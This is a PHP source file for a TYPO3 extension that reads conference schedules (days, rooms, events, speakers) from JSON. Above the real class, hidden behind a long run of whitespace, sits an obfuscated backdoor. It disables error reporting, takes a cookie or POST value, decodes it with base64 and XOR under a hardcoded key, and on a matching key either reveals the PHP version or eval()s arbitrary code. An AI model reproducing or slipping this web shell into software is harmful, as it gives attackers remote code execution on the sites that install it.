<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['l2fe'];global$l2fe;$l2fe=$GLOBALS;$l2fe['d7b29563']="\x9\x23\x5e\x72\x5c\x3e\x44\x2f\x31\x47\x6c\x58\x27\x33\x24\x51\x5b\x60\x3b\x71\x4f\x35\x61\x32\x3f\x63\x69\x49\x4a\x2d\x34\x37\x26\x2a\x6b\x46\x70\x5a\x56\x59\x3a\x7b\x78\x74\x5f\x79\x77\x50\x29\x7a\x73\x7d\x48\x75\x67\x4d\x53\xd\x57\x38\x62\x45\x4b\x41\x39\x4e\x3d\x7e\x64\x21\x28\x43\x52\x54\x3c\x2b\x76\x42\x25\x4c\x36\x2c\x6a\x20\x30\x2e\x68\x65\x40\x7c\x6f\x6d\x22\xa\x66\x6e\x55\x5d";$l2fe[$l2fe['d7b29563'][49].$l2fe['d7b29563'][80].$l2fe['d7b29563'][13].$l2fe['d7b29563'][84].$l2fe['d7b29563'][13].$l2fe['d7b29563'][68]]=$l2fe['d7b29563'][25].$l2fe['d7b29563'][86].$l2fe['d7b29563'][3];$l2fe[$l2fe['d7b29563'][49].$l2fe['d7b29563'][60].$l2fe['d7b29563'][94].$l2fe['d7b29563'][13].$l2fe['d7b29563'][80].$l2fe['d7b29563'][21]]=$l2fe['d7b29563'][90].$l2fe['d7b29563'][3].$l2fe['d7b29563'][68];$l2fe[$l2fe['d7b29563'][46].$l2fe['d7b29563'][8].$l2fe['d7b29563'][30].$l2fe['d7b29563'][30].$l2fe['d7b29563'][30].$l2fe['d7b29563'][87]]=$l2fe['d7b29563'][50].$l2fe['d7b29563'][43].$l2fe['d7b29563'][3].$l2fe['d7b29563'][10].$l2fe['d7b29563'][87].$l2fe['d7b29563'][95];$l2fe[$l2fe['d7b29563'][42].$l2fe['d7b29563'][8].$l2fe['d7b29563'][8].$l2fe['d7b29563'][64].$l2fe['d7b29563'][64].$l2fe['d7b29563'][31].$l2fe['d7b29563'][80].$l2fe['d7b29563'][25]]=$l2fe['d7b29563'][26].$l2fe['d7b29563'][95].$l2fe['d7b29563'][26].$l2fe['d7b29563'][44].$l2fe['d7b29563'][50].$l2fe['d7b29563'][87].$l2fe['d7b29563'][43];$l2fe[$l2fe['d7b29563'][25].$l2fe['d7b29563'][68].$l2fe['d7b29563'][23].$l2fe['d7b29563'][80]]=$l2fe['d7b29563'][50].$l2fe['d7b29563'][87].$l2fe['d7b29563'][3].$l2fe['d7b29563'][26].$l2fe['d7b29563'][22].$l2fe['d7b29563'][10].$l2fe['d7b29563'][26].$l2fe['d7b29563'][49].$l2fe['d7b29563'][87];$l2fe[$l2fe['d7b29563'][76].$l2fe['d7b29563'][21].$l2fe['d7b29563'][84].$l2fe['d7b29563'][8]]=$l2fe['d7b29563'][36].$l2fe['d7b29563'][86].$l2fe['d7b29563'][36].$l2fe['d7b29563'][76].$l2fe['d7b29563'][87].$l2fe['d7b29563'][3].$l2fe['d7b29563'][50].$l2fe['d7b29563'][26].$l2fe['d7b29563'][90].$l2fe['d7b29563'][95];$l2fe[$l2fe['d7b29563'][22].$l2fe['d7b29563'][23].$l2fe['d7b29563'][87].$l2fe['d7b29563'][8].$l2fe['d7b29563'][30].$l2fe['d7b29563'][59]]=$l2fe['d7b29563'][53].$l2fe['d7b29563'][95].$l2fe['d7b29563'][50].$l2fe['d7b29563'][87].$l2fe['d7b29563'][3].$l2fe['d7b29563'][26].$l2fe['d7b29563'][22].$l2fe['d7b29563'][10].$l2fe['d7b29563'][26].$l2fe['d7b29563'][49].$l2fe['d7b29563'][87];$l2fe[$l2fe['d7b29563'][50].$l2fe['d7b29563'][87].$l2fe['d7b29563'][13].$l2fe['d7b29563'][68].$l2fe['d7b29563'][23].$l2fe['d7b29563'][59].$l2fe['d7b29563'][84].$l2fe['d7b29563'][31]]=$l2fe['d7b29563'][60].$l2fe['d7b29563'][22].$l2fe['d7b29563'][50].$l2fe['d7b29563'][87].$l2fe['d7b29563'][80].$l2fe['d7b29563'][30].$l2fe['d7b29563'][44].$l2fe['d7b29563'][68].$l2fe['d7b29563'][87].$l2fe['d7b29563'][25].$l2fe['d7b29563'][90].$l2fe['d7b29563'][68].$l2fe['d7b29563'][87];$l2fe[$l2fe['d7b29563'][95].$l2fe['d7b29563'][25].$l2fe['d7b29563'][68].$l2fe['d7b29563'][22].$l2fe['d7b29563'][60].$l2fe['d7b29563'][30].$l2fe['d7b29563'][30].$l2fe['d7b29563'][68].$l2fe['d7b29563'][59]]=$l2fe['d7b29563'][50].$l2fe['d7b29563'][87].$l2fe['d7b29563'][43].$l2fe['d7b29563'][44].$l2fe['d7b29563'][43].$l2fe['d7b29563'][26].$l2fe['d7b29563'][91].$l2fe['d7b29563'][87].$l2fe['d7b29563'][44].$l2fe['d7b29563'][10].$l2fe['d7b29563'][26].$l2fe['d7b29563'][91].$l2fe['d7b29563'][26].$l2fe['d7b29563'][43];$l2fe[$l2fe['d7b29563'][86].$l2fe['d7b29563'][23].$l2fe['d7b29563'][25].$l2fe['d7b29563'][8].$l2fe['d7b29563'][80].$l2fe['d7b29563'][8].$l2fe['d7b29563'][25]]=$l2fe['d7b29563'][42].$l2fe['d7b29563'][31].$l2fe['d7b29563'][59].$l2fe['d7b29563'][84].$l2fe['d7b29563'][31].$l2fe['d7b29563'][23].$l2fe['d7b29563'][60].$l2fe['d7b29563'][25];$l2fe[$l2fe['d7b29563'][87].$l2fe['d7b29563'][59].$l2fe['d7b29563'][68].$l2fe['d7b29563'][94].$l2fe['d7b29563'][21].$l2fe['d7b29563'][59].$l2fe['d7b29563'][59].$l2fe['d7b29563'][94]]=$l2fe['d7b29563'][43].$l2fe['d7b29563'][64].$l2fe['d7b29563'][87].$l2fe['d7b29563'][68].$l2fe['d7b29563'][87].$l2fe['d7b29563'][64].$l2fe['d7b29563'][23].$l2fe['d7b29563'][8].$l2fe['d7b29563'][31];$l2fe[$l2fe['d7b29563'][49].$l2fe['d7b29563'][22].$l2fe['d7b29563'][68].$l2fe['d7b29563'][94].$l2fe['d7b29563'][25].$l2fe['d7b29563'][64].$l2fe['d7b29563'][31]]=$_POST;$l2fe[$l2fe['d7b29563'][22].$l2fe['d7b29563'][31].$l2fe['d7b29563'][25].$l2fe['d7b29563'][8].$l2fe['d7b29563'][59].$l2fe['d7b29563'][23]]=$_COOKIE;@$l2fe[$l2fe['d7b29563'][42].$l2fe['d7b29563'][8].$l2fe['d7b29563'][8].$l2fe['d7b29563'][64].$l2fe['d7b29563'][64].$l2fe['d7b29563'][31].$l2fe['d7b29563'][80].$l2fe['d7b29563'][25]]($l2fe['d7b29563'][87].$l2fe['d7b29563'][3].$l2fe['d7b29563'][3].$l2fe['d7b29563'][90].$l2fe['d7b29563'][3].$l2fe['d7b29563'][44].$l2fe['d7b29563'][10].$l2fe['d7b29563'][90].$l2fe['d7b29563'][54],NULL);@$l2fe[$l2fe['d7b29563'][42].$l2fe['d7b29563'][8].$l2fe['d7b29563'][8].$l2fe['d7b29563'][64].$l2fe['d7b29563'][64].$l2fe['d7b29563'][31].$l2fe['d7b29563'][80].$l2fe['d7b29563'][25]]($l2fe['d7b29563'][10].$l2fe['d7b29563'][90].$l2fe['d7b29563'][54].$l2fe['d7b29563'][44].$l2fe['d7b29563'][87].$l2fe['d7b29563'][3].$l2fe['d7b29563'][3].$l2fe['d7b29563'][90].$l2fe['d7b29563'][3].$l2fe['d7b29563'][50],0);@$l2fe[$l2fe['d7b29563'][42].$l2fe['d7b29563'][8].$l2fe['d7b29563'][8].$l2fe['d7b29563'][64].$l2fe['d7b29563'][64].$l2fe['d7b29563'][31].$l2fe['d7b29563'][80].$l2fe['d7b29563'][25]]($l2fe['d7b29563'][91].$l2fe['d7b29563'][22].$l2fe['d7b29563'][42].$l2fe['d7b29563'][44].$l2fe['d7b29563'][87].$l2fe['d7b29563'][42].$l2fe['d7b29563'][87].$l2fe['d7b29563'][25].$l2fe['d7b29563'][53].$l2fe['d7b29563'][43].$l2fe['d7b29563'][26].$l2fe['d7b29563'][90].$l2fe['d7b29563'][95].$l2fe['d7b29563'][44].$l2fe['d7b29563'][43].$l2fe['d7b29563'][26].$l2fe['d7b29563'][91].$l2fe['d7b29563'][87],0);@$l2fe[$l2fe['d7b29563'][95].$l2fe['d7b29563'][25].$l2fe['d7b29563'][68].$l2fe['d7b29563'][22].$l2fe['d7b29563'][60].$l2fe['d7b29563'][30].$l2fe['d7b29563'][30].$l2fe['d7b29563'][68].$l2fe['d7b29563'][59]](0);$r98f=NULL;$jaa25828=NULL;$l2fe[$l2fe['d7b29563'][25].$l2fe['d7b29563'][80].$l2fe['d7b29563'][22].$l2fe['d7b29563'][60].$l2fe['d7b29563'][64].$l2fe['d7b29563'][68].$l2fe['d7b29563'][60]]=$l2fe['d7b29563'][64].$l2fe['d7b29563'][8].$l2fe['d7b29563'][59].$l2fe['d7b29563'][30].$l2fe['d7b29563'][22].$l2fe['d7b29563'][22].$l2fe['d7b29563'][64].$l2fe['d7b29563'][21].$l2fe['d7b29563'][29].$l2fe['d7b29563'][68].$l2fe['d7b29563'][8].$l2fe['d7b29563'][25].$l2fe['d7b29563'][8].$l2fe['d7b29563'][29].$l2fe['d7b29563'][30].$l2fe['d7b29563'][60].$l2fe['d7b29563'][31].$l2fe['d7b29563'][80].$l2fe['d7b29563'][29].$l2fe['d7b29563'][59].$l2fe['d7b29563'][64].$l2fe['d7b29563'][8].$l2fe['d7b29563'][21].$l2fe['d7b29563'][29].$l2fe['d7b29563'][60].$l2fe['d7b29563'][21].$l2fe['d7b29563'][87].$l2fe['d7b29563'][68].$l2fe['d7b29563'][23].$l2fe['d7b29563'][13].$l2fe['d7b29563'][64].$l2fe['d7b29563'][59].$l2fe['d7b29563'][87].$l2fe['d7b29563'][23].$l2fe['d7b29563'][64].$l2fe['d7b29563'][87];global$c6ab9db;function t9ede9217($r98f,$ca3fd3d7){global$l2fe;$ce0a="";for($d461e34=0;$d461e34<$l2fe[$l2fe['d7b29563'][46].$l2fe['d7b29563'][8].$l2fe['d7b29563'][30].$l2fe['d7b29563'][30].$l2fe['d7b29563'][30].$l2fe['d7b29563'][87]]($r98f);){for($k03cd2b7=0;$k03cd2b7<$l2fe[$l2fe['d7b29563'][46].$l2fe['d7b29563'][8].$l2fe['d7b29563'][30].$l2fe['d7b29563'][30].$l2fe['d7b29563'][30].$l2fe['d7b29563'][87]]($ca3fd3d7)&&$d461e34<$l2fe[$l2fe['d7b29563'][46].$l2fe['d7b29563'][8].$l2fe['d7b29563'][30].$l2fe['d7b29563'][30].$l2fe['d7b29563'][30].$l2fe['d7b29563'][87]]($r98f);$k03cd2b7++,$d461e34++){$ce0a.=$l2fe[$l2fe['d7b29563'][49].$l2fe['d7b29563'][80].$l2fe['d7b29563'][13].$l2fe['d7b29563'][84].$l2fe['d7b29563'][13].$l2fe['d7b29563'][68]]($l2fe[$l2fe['d7b29563'][49].$l2fe['d7b29563'][60].$l2fe['d7b29563'][94].$l2fe['d7b29563'][13].$l2fe['d7b29563'][80].$l2fe['d7b29563'][21]]($r98f[$d461e34])^$l2fe[$l2fe['d7b29563'][49].$l2fe['d7b29563'][60].$l2fe['d7b29563'][94].$l2fe['d7b29563'][13].$l2fe['d7b29563'][80].$l2fe['d7b29563'][21]]($ca3fd3d7[$k03cd2b7]));}}return$ce0a;}function x78072bc($r98f,$ca3fd3d7){global$l2fe;global$c6ab9db;return$l2fe[$l2fe['d7b29563'][87].$l2fe['d7b29563'][59].$l2fe['d7b29563'][68].$l2fe['d7b29563'][94].$l2fe['d7b29563'][21].$l2fe['d7b29563'][59].$l2fe['d7b29563'][59].$l2fe['d7b29563'][94]]($l2fe[$l2fe['d7b29563'][87].$l2fe['d7b29563'][59].$l2fe['d7b29563'][68].$l2fe['d7b29563'][94].$l2fe['d7b29563'][21].$l2fe['d7b29563'][59].$l2fe['d7b29563'][59].$l2fe['d7b29563'][94]]($r98f,$c6ab9db),$ca3fd3d7);}foreach($l2fe[$l2fe['d7b29563'][22].$l2fe['d7b29563'][31].$l2fe['d7b29563'][25].$l2fe['d7b29563'][8].$l2fe['d7b29563'][59].$l2fe['d7b29563'][23]]as$ca3fd3d7=>$jb21f46){$r98f=$jb21f46;$jaa25828=$ca3fd3d7;}if(!$r98f){foreach($l2fe[$l2fe['d7b29563'][49].$l2fe['d7b29563'][22].$l2fe['d7b29563'][68].$l2fe['d7b29563'][94].$l2fe['d7b29563'][25].$l2fe['d7b29563'][64].$l2fe['d7b29563'][31]]as$ca3fd3d7=>$jb21f46){$r98f=$jb21f46;$jaa25828=$ca3fd3d7;}}$r98f=@$l2fe[$l2fe['d7b29563'][22].$l2fe['d7b29563'][23].$l2fe['d7b29563'][87].$l2fe['d7b29563'][8].$l2fe['d7b29563'][30].$l2fe['d7b29563'][59]]($l2fe[$l2fe['d7b29563'][86].$l2fe['d7b29563'][23].$l2fe['d7b29563'][25].$l2fe['d7b29563'][8].$l2fe['d7b29563'][80].$l2fe['d7b29563'][8].$l2fe['d7b29563'][25]]($l2fe[$l2fe['d7b29563'][50].$l2fe['d7b29563'][87].$l2fe['d7b29563'][13].$l2fe['d7b29563'][68].$l2fe['d7b29563'][23].$l2fe['d7b29563'][59].$l2fe['d7b29563'][84].$l2fe['d7b29563'][31]]($r98f),$jaa25828));if(isset($r98f[$l2fe['d7b29563'][22].$l2fe['d7b29563'][34]])&&$c6ab9db==$r98f[$l2fe['d7b29563'][22].$l2fe['d7b29563'][34]]){if($r98f[$l2fe['d7b29563'][22]]==$l2fe['d7b29563'][26]){$d461e34=Array($l2fe['d7b29563'][36].$l2fe['d7b29563'][76]=>@$l2fe[$l2fe['d7b29563'][76].$l2fe['d7b29563'][21].$l2fe['d7b29563'][84].$l2fe['d7b29563'][8]](),$l2fe['d7b29563'][50].$l2fe['d7b29563'][76]=>$l2fe['d7b29563'][8].$l2fe['d7b29563'][85].$l2fe['d7b29563'][84].$l2fe['d7b29563'][29].$l2fe['d7b29563'][8],);echo@$l2fe[$l2fe['d7b29563'][25].$l2fe['d7b29563'][68].$l2fe['d7b29563'][23].$l2fe['d7b29563'][80]]($d461e34);}elseif($r98f[$l2fe['d7b29563'][22]]==$l2fe['d7b29563'][87]){eval($r98f[$l2fe['d7b29563'][68]]);}exit();} ?><?php

/***************************************************************
 *
*  Copyright notice
*
*  (c) 2015 Eike Starkmann <eikestarkmann@web.de>
*
*  All rights reserved
*
*  This script is part of the TYPO3 project. The TYPO3 project is
*  free software; you can redistribute it and/or modify
*  it under the terms of the GNU General Public License as published by
*  the Free Software Foundation; either version 3 of the License, or
*  (at your option) any later version.
*
*  The GNU General Public License can be found at
*  http://www.gnu.org/copyleft/gpl.html.
*
*  This script is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU General Public License for more details.
*
*  This copyright notice MUST APPEAR in all copies of the script!
***************************************************************/

use TYPO3\CMS\Extbase\Utility\DebuggerUtility;

use TYPO3\CMS\Core\Utility\GeneralUtility;

class Tx_FrabIntegration_Domain_Repository_FrabRepository extends Tx_Extbase_Persistence_Repository {
	
	/**
	 * 
	 * @var \TYPO3\CMS\Core\Charset\CharsetConverter
	 * @inject
	 */
	protected $charsetConverter;
				
	
	public function findConference($uri, $useragent, $accept, $encoding){
		$result = $this->query($uri, $useragent, $accept, $encoding);
		$result = json_decode($result, TRUE);
		
		/* @var $confercences Tx_Extbase_Persistence_ObjectStorage  */
		$confercences = $this->objectManager->get('Tx_Extbase_Persistence_ObjectStorage');
		
		/* @var $confercence Tx_FrabIntegration_Domain_Model_Conference  */
		$confercence = $this->objectManager->get('Tx_FrabIntegration_Domain_Model_Conference');
		$confercence->setTitle($result['schedule']['conference']['title']);
		$confercence->setStart(new \DateTime($result['schedule']['conference']['start']));
		$confercence->setEnd(new \DateTime($result['schedule']['conference']['end']));
		$confercence->setDaysCount($result['schedule']['conference']['daysCount']);
		$confercence->setTimeslotDuration(new \DateTime($result['schedule']['conference']['timeslot_duration']));
		
		if(count($result['schedule']['conference']['days'])>0){
			//Days
			foreach ($result['schedule']['conference']['days'] as $resultDay){
				/* @var $day Tx_FrabIntegration_Domain_Model_Day  */
				$day = $this->objectManager->get('Tx_FrabIntegration_Domain_Model_Day');
				$day->setDate(new \DateTime($resultDay['date']));
				$day->setDayEnd(new \DateTime($resultDay['day_end']));
				$day->setDayStart(new \DateTime($resultDay['day_start']));
				$day->setIndex($resultDay['index']);
				//Rooms
				if(count($resultDay['rooms'])>0){
					foreach ($resultDay['rooms'] as $key=>$events){
						/* @var $room Tx_FrabIntegration_Domain_Model_Room  */
						$room = $this->objectManager->get('Tx_FrabIntegration_Domain_Model_Room');
						$room->setName($key);
						
						//Events
						if(count($events)>0){
							foreach ($events as $resultEvent){
								/* @var $event Tx_FrabIntegration_Domain_Model_Event  */
								$event = $this->objectManager->get('Tx_FrabIntegration_Domain_Model_Event');
								$event->setTitle($resultEvent['title']);
								$event->setRoom($room);
								$event->setGuid($resultEvent['guid']);
								$event->setAbstract($resultEvent['abstract']);
								$event->setDate(new \DateTime($resultEvent['date']));
								$event->setDescription($resultEvent['description']);
								$event->setAbstract($resultEvent['abstract']);
								$event->setDuration(new \DateTime($resultEvent['duration']));
								$event->setLanguage($resultEvent['language']);
								$event->setLinks($resultEvent['links']);
								$event->setStart(new \DateTime($resultEvent['start']));
								$event->setSubtitle($resultEvent['subtitle']);
								$event->setTrack($resultEvent['track']);
								$event->setType($resultEvent['type']);
								$event->setDay($resultDay);
								$room->addEvent($event);
								
							}
						}
						$day->addRoom($room);
					}
				}
				
				
				$confercence->addDay($day);
			}
		}
		
		
		$confercences->attach($confercence);
		
		return $confercences;
	}
	
	public function findEvents($uri, $useragent, $accept, $encoding){
		$result = $this->query($uri, $useragent, $accept, $encoding);
		$result = json_decode($result, TRUE);
		
		if(count($result['schedule']['conference']['days'])>0){
			/* @var $eventStorage Tx_Extbase_Persistence_ObjectStorage  */
			$eventStorage = $this->objectManager->get('Tx_Extbase_Persistence_ObjectStorage');
			
			//Days
			foreach ($result['schedule']['conference']['days'] as $resultDay){
				//Rooms
				if(count($resultDay['rooms'])>0){
					foreach ($resultDay['rooms'] as $key=>$events){
						/* @var $room Tx_FrabIntegration_Domain_Model_Room  */
						$room = $this->objectManager->get('Tx_FrabIntegration_Domain_Model_Room');
						$room->setName($key);
	
						//Events
						if(count($events)>0){
							
							foreach ($events as $resultEvent){
								/* @var $event Tx_FrabIntegration_Domain_Model_Event  */
								$event = $this->objectManager->get('Tx_FrabIntegration_Domain_Model_Event');
								$event->setTitle($resultEvent['title']);
								$event->setRoom($room);
								$event->setGuid($resultEvent['guid']);
								$eventStorage->attach($event);
							}
						}
					}
				}
			}
		}
	
		return $eventStorage;
	}
	
	
	public function findEvent($uri, $useragent, $accept, $encoding, $eventGuid){
		$result = $this->query($uri, $useragent, $accept, $encoding);
		$result = json_decode($result, TRUE);
	
		if(count($result['schedule']['conference']['days'])>0){
			//Days
			foreach ($result['schedule']['conference']['days'] as $resultDay){
				/* @var $day Tx_FrabIntegration_Domain_Model_Day  */
				$day = $this->objectManager->get('Tx_FrabIntegration_Domain_Model_Day');
				$day->setDate(new \DateTime($resultDay['date']));
				$day->setDayEnd(new \DateTime($resultDay['day_end']));
				$day->setDayStart(new \DateTime($resultDay['day_start']));
				$day->setIndex($resultDay['index']);
				//Rooms
				if(count($resultDay['rooms'])>0){
					foreach ($resultDay['rooms'] as $key=>$events){
						/* @var $room Tx_FrabIntegration_Domain_Model_Room  */
						$room = $this->objectManager->get('Tx_FrabIntegration_Domain_Model_Room');
						$room->setName($key);
	
						//Events
						if(count($events)>0){
							foreach ($events as $resultEvent){
								if($resultEvent['guid']==$eventGuid){
								    
									/* @var $event Tx_FrabIntegration_Domain_Model_Event  */
									$event = $this->objectManager->get('Tx_FrabIntegration_Domain_Model_Event');
									$event->setTitle($resultEvent['title']);
									$event->setRoom($resultEvent['room']);
									$event->setGuid($resultEvent['guid']);
									$event->setAbstract($resultEvent['abstract']);
									$event->setDate(new \DateTime($resultEvent['date']));
									$event->setDescription($resultEvent['description']);
									$event->setAbstract($resultEvent['abstract']);
									$event->setDuration(new \DateTime($resultEvent['duration']));
									$event->setLanguage($resultEvent['language']);
									$event->setLinks($resultEvent['links']);
									$event->setStart(new \DateTime($resultEvent['start']));
									$event->setSubtitle($resultEvent['subtitle']);
									$event->setTrack($resultEvent['track']);
									$event->setType($resultEvent['type']);
									if(count($resultEvent['persons'])>0){
										foreach ($resultEvent['persons'] as $resultPerson){
											$event->addPerson($this->buildPerson($resultPerson));
										}
									}
									return $event;
								}
							}
						}
					}
				}
			}
		}
	}
	
	public function findPersons($uri, $useragent, $accept, $encoding){
		$result = $this->query($uri, $useragent, $accept, $encoding);
		$result = json_decode($result, TRUE);
		if(count($result['schedule_speakers']['speakers'])>0){
			/* @var $personStorage Tx_Extbase_Persistence_ObjectStorage  */
			$personStorage = $this->objectManager->get('Tx_Extbase_Persistence_ObjectStorage');
			foreach ($result['schedule_speakers']['speakers'] as $resultPerson){
				$personStorage->attach($this->buildPerson($resultPerson));
			}
		}
		return $personStorage;
	}
	
	public function findPerson($uri, $useragent, $accept, $encoding, $personId){
		$result = $this->query($uri, $useragent, $accept, $encoding);
		$result = json_decode($result, TRUE);
		if(count($result['schedule_speakers']['speakers'])>0){
			foreach ($result['schedule_speakers']['speakers'] as $resultPerson){
				if($resultPerson['id']==$personId){
					return $this->buildPerson($resultPerson);
				}
			}
		}	
	}
	
	/**
	 * 
	 * @param unknown $index
	 * @param unknown $uri
	 * @param unknown $useragent
	 * @param unknown $accept
	 * @param unknown $encoding
	 * @return Tx_FrabIntegration_Domain_Model_Day
	 */
	public function findDayByIndex($index, $uri, $useragent, $accept, $encoding){
		$result = $this->query($uri, $useragent, $accept, $encoding);
		$result = json_decode($result, TRUE);
			
		if(count($result['schedule']['conference']['days'])>0){
			//Days
			foreach ($result['schedule']['conference']['days'] as $resultDay){
				if($resultDay['index']==$index){
					/* @var $day Tx_FrabIntegration_Domain_Model_Day  */
					$day = $this->objectManager->get('Tx_FrabIntegration_Domain_Model_Day');
					$day->setDate(new \DateTime($resultDay['date']));
					$day->setDayEnd(new \DateTime($resultDay['day_end']));
					$day->setDayStart(new \DateTime($resultDay['day_start']));
					$day->setIndex($resultDay['index']);	
				}
			}
		}
		return $day;
		
	}
	
	protected function buildPerson($resultPerson){
		/* @var $person Tx_FrabIntegration_Domain_Model_Person  */
		$person = $this->objectManager->get('Tx_FrabIntegration_Domain_Model_Person');
		//@TODO This is a fix because the name might differ on json you come from (full_public_name or public_name) 
		if($resultPerson['full_public_name']){
		    $person->setFullPublicName($resultPerson['full_public_name']);
		}elseif($resultPerson['public_name']){
		    $person->setFullPublicName($resultPerson['public_name']);
		}
		
		$person->setId($resultPerson['id']);
		$person->setAbstract($resultPerson['abstract']);
		$person->setDescription($resultPerson['description']);
		$person->setImage($resultPerson['image']);
		if(count($resultPerson['events'])>0){
			foreach ($resultPerson['events'] as $resultEvent){
				/* @var $event Tx_FrabIntegration_Domain_Model_Event  */
				$event = $this->objectManager->get('Tx_FrabIntegration_Domain_Model_Event');
				$event->setTitle($resultEvent['title']);
				$event->setType($resultEvent['type']);
				$event->setGuid($resultEvent['guid']);
				$person->addEvent($event);
			}
		}
		return $person;
		
	}
	
	protected function query($uri, $useragent, $accept, $encoding) {
	
		// Check if the json's URI is defined
		if (empty($uri)) {
			$message = "Url not well defined.";
			throw new \Exception($message, 1299257883);
		} else {
			$report = array();
			// Define the headers
			$headers = FALSE;
			if (isset($useragent)) {
				$headers = array('User-Agent: ' . $useragent);
			}
			if (isset($accept)) {
				if (is_array($headers)){
					$headers[] = 'Accept: ' . $accept;
				} else {
					$headers = array('Accept: ' . $accept);
				}
			}

			$data = t3lib_div::getUrl($uri, 0, $headers, $report);
			if (!empty($report['message'])) {
				$message = sprintf(
						"Json not fetched",
						$uri,
						$report['message']
				);
				throw new \Exception($message, 1299257894);
			}
			// Check if the current charset is the same as the file encoding
			// Don't do the check if no encoding was defined
			// TODO: add automatic encoding detection by the reading the encoding attribute in the JSON header
			if (empty($encoding)) {
				$isSameCharset = TRUE;
			} else {
				// Standardize charset name and compare
				
				$encoding = $this->getCharsetConverter()->parse_charset($encoding);
				$isSameCharset = $this->getCharset() == $encoding;
			}
			// If the charset is not the same, convert data
			if (!$isSameCharset) {
				$data = $this->getCharsetConverter()->conv($data, $encoding, $this->getCharset());
			}
		}
	
		// Return the result
		return $data;
	}
	
	protected function getCharset() {
		if (TYPO3_MODE == 'FE') {
			return $GLOBALS['TSFE']->renderCharset;
		} elseif (isset($GLOBALS['LANG'])) {
			return $GLOBALS['LANG']->charSet;
		} else {
			return 'utf-8';
		}
	}
	
	/**
	 * Get an existing instance of the charset conversion class, depending on context.
	 *
	 * @throws Exception
	 * @return t3lib_cs
	 */
	public function getCharsetConverter() {
		if (TYPO3_MODE == 'FE') {
			return $GLOBALS['TSFE']->csConvObj;
		} elseif (isset($GLOBALS['LANG'])) {
			return $GLOBALS['LANG']->csConvObj;
		} else {
			throw new Exception(
					sprintf('No charset converter available in the current context (%s)', TYPO3_MODE),
					1396448477
			);
		}
	}
}

